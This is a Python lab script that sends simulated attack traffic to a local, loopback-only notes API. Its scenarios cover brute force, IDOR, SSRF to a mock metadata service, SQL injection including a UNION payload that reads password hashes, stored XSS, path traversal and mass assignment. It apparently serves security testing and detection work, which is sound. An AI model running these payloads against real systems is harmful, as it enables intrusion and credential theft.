#!/usr/bin/env python3
"""AUTHORIZED LAB USE ONLY.

Generates simulated adversary-like HTTP traffic against the local notes API.
Refuses any target that is not loopback.
"""

from __future__ import annotations

import argparse
import json
import sys
import urllib.error
import urllib.parse
import urllib.request

BANNER = "AUTHORIZED LAB USE ONLY — local lab target required"


def assert_local(base: str) -> None:
    parsed = urllib.parse.urlparse(base)
    host = (parsed.hostname or "").lower()
    if host not in {"127.0.0.1", "localhost", "::1"}:
        sys.exit(f"Refusing non-local target {base!r}. {BANNER}")
    if parsed.scheme != "http":
        sys.exit("Refusing non-http target. Use the local lab http endpoint.")


def request(base: str, method: str, path: str, token: str | None = None, data: dict | None = None, query: dict | None = None, headers: dict | None = None) -> tuple[int, str]:
    url = base.rstrip("/") + path
    if query:
        url += "?" + urllib.parse.urlencode(query)
    body = None
    headers = {"Accept": "application/json", **(headers or {})}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    if data is not None:
        body = json.dumps(data).encode()
        headers["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode()


def login(base: str, username: str, password: str) -> str:
    code, body = request(base, "POST", "/login", data={"username": username, "password": password})
    if code != 200:
        raise SystemExit(f"login failed for {username}: {code} {body}")
    return json.loads(body)["token"]


def scenario_brute_force(base: str) -> None:
    print("[*] T1110.001 password guessing (benign, will not succeed)")
    for i in range(6):
        code, _ = request(
            base,
            "POST",
            "/login",
            data={"username": "alice", "password": f"wrong-password-{i}"},
        )
        print(f"    attempt {i + 1}: HTTP {code}")


def scenario_idor(base: str) -> None:
    print("[*] Broken object-level authorization: Alice reads Bob's note 2")
    token = login(base, "alice", "alice-lab-password")
    code, body = request(base, "GET", "/notes/2", token=token)
    print(f"    GET /notes/2 -> HTTP {code}")
    print(f"    body: {body[:300]}")


def scenario_admin(base: str) -> None:
    print("[*] Broken function-level authorization: Alice calls /admin/users")
    token = login(base, "alice", "alice-lab-password")
    code, body = request(base, "GET", "/admin/users", token=token)
    print(f"    GET /admin/users -> HTTP {code}")
    print(f"    body: {body[:300]}")


def scenario_ssrf(base: str) -> None:
    print("[*] SSRF to synthetic metadata (T1552.005) — dummy credentials only")
    token = login(base, "alice", "alice-lab-password")
    code, body = request(
        base,
        "GET",
        "/fetch",
        token=token,
        query={"url": "http://mock-imds/latest/meta-data/iam/security-credentials/lab-role"},
    )
    print(f"    GET /fetch -> HTTP {code}")
    print(f"    body: {body[:400]}")


def scenario_injection(base: str) -> None:
    print("[*] Search injection (benign payload, local sqlite only)")
    token = login(base, "alice", "alice-lab-password")
    payload = "' OR owner = 'bob' OR title LIKE '"
    code, body = request(base, "GET", "/search", token=token, query={"q": payload})
    print(f"    GET /search -> HTTP {code}")
    print(f"    body: {body[:400]}")


def scenario_injection_union(base: str) -> None:
    print("[*] UNION-based search injection (reads the users table; lab sqlite only)")
    token = login(base, "alice", "alice-lab-password")
    payload = "zzz' UNION SELECT 1, username, password_hash FROM users --"
    code, body = request(base, "GET", "/search", token=token, query={"q": payload})
    print(f"    GET /search -> HTTP {code}")
    print(f"    body: {body[:400]}")


def scenario_xss(base: str) -> None:
    print("[*] Stored XSS: save a script note, then render it (nothing executes here)")
    token = login(base, "alice", "alice-lab-password")
    code, body = request(
        base,
        "POST",
        "/notes",
        token=token,
        data={"title": "lab xss", "body": "<script>alert('lab')</script>"},
    )
    print(f"    POST /notes -> HTTP {code}")
    note_id = json.loads(body).get("id") if code == 200 else None
    if note_id is None:
        return
    code, body = request(base, "GET", f"/notes/{note_id}/page", token=token)
    print(f"    GET /notes/{note_id}/page -> HTTP {code}")
    print(f"    body: {body[:300]}")


def scenario_traversal(base: str) -> None:
    print("[*] Path traversal: read the sandbox canary through /files")
    token = login(base, "alice", "alice-lab-password")
    code, body = request(base, "GET", "/files", token=token, query={"name": "../canary.txt"})
    print(f"    GET /files?name=../canary.txt -> HTTP {code}")
    print(f"    body: {body[:300]}")


def scenario_mass_assign(base: str) -> None:
    print("[*] Mass assignment: Alice names role=admin in a profile update")
    token = login(base, "alice", "alice-lab-password")
    try:
        code, body = request(base, "PATCH", "/users/me", token=token, data={"display_name": "A", "role": "admin"})
        print(f"    PATCH /users/me -> HTTP {code}")
        print(f"    body: {body[:300]}")
        code, body = request(base, "GET", "/whoami", token=login(base, "alice", "alice-lab-password"))
        print(f"    GET /whoami after re-login -> HTTP {code} {body[:100]}")
    finally:
        # Undo it so later scenarios still see Alice as a plain user.
        code, _ = request(base, "PATCH", "/users/me", token=token, data={"role": "user"})
        print("    (restored role=user)" if code == 200 else f"    (nothing to restore: HTTP {code})")


def scenario_fail_open(base: str) -> None:
    print("[*] Fail-open: a malformed X-Tenant header crashes the policy check")
    token = login(base, "alice", "alice-lab-password")
    code, body = request(base, "GET", "/notes/2/export", token=token, headers={"X-Tenant": "abc"})
    print(f"    GET /notes/2/export (X-Tenant: abc) -> HTTP {code}")
    print(f"    body: {body[:300]}")


def scenario_error_leak(base: str) -> None:
    print("[*] Verbose errors: ask for an export format that does not exist")
    token = login(base, "alice", "alice-lab-password")
    code, body = request(base, "GET", "/notes/1/export", token=token, query={"format": "pdf"})
    print(f"    GET /notes/1/export?format=pdf -> HTTP {code}")
    print(f"    body: {body[:300]}")


SCENARIOS = {
    "brute_force": scenario_brute_force,
    "idor": scenario_idor,
    "admin": scenario_admin,
    "ssrf": scenario_ssrf,
    "injection": scenario_injection,
    "injection_union": scenario_injection_union,
    "xss": scenario_xss,
    "traversal": scenario_traversal,
    "fail_open": scenario_fail_open,
    "error_leak": scenario_error_leak,
    "mass_assign": scenario_mass_assign,
}


def main() -> None:
    parser = argparse.ArgumentParser(description=BANNER)
    parser.add_argument("--base", default="http://127.0.0.1:8080")
    parser.add_argument(
        "--scenario",
        default="all",
        choices=["all", *SCENARIOS],
    )
    args = parser.parse_args()
    print(BANNER)
    assert_local(args.base)
    names = SCENARIOS if args.scenario == "all" else [args.scenario]
    for name in names:
        print(f"\n=== {name} ===")
        SCENARIOS[name](args.base)
    print("\nNext: curl -s -X POST http://127.0.0.1:8090/ingest | python3 -m json.tool")


if __name__ == "__main__":
    main()
